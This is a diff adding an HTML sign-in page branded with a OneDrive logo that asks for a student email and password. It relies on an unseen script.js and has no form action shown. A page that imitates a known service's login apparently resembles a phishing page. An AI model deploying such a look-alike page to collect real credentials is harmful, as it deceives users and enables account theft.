@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+  <div class="login-container">
+
+    <div class="logo">
+      <div class="icon">
+        <img src="onedrive-logo.png" alt="OneDrive Logo">
+      </div>
+    </div>
+
+    <h1>Sign In</h1>
+
+    <form id="loginForm">
+
+      <div class="input-group">
+        <input
+          type="email"
+          id="email"
+          placeholder="Student Email"
+          required
+        >
+      </div>
+
+      <div class="input-group">
+        <input
+          type="password"
+          id="password"
+          placeholder="Password"
+          required
+        >
+      </div>
+
+      <div class="options">
+
+        <label class="checkbox-label">
+          <input type="checkbox" id="showPass">
+          Show Password
+        </label>
+
+        <label class="checkbox-label">
+          <input type="checkbox" id="remember">
+          Remember Me
+        </label>
+
+      </div>
+
+      <button type="submit" id="loginBtn">
+        <span class="btn-text">Login</span>
+      </button>
+
+    </form>
+
+    <p class="footer">
+      By logging in, you accept our
+      <strong>End User Terms of Use</strong><br>
+      Forgot Password?
+    </p>
+
+  </div>
+
+  <script src="script.js"></script>
+
+</body>
+</html>
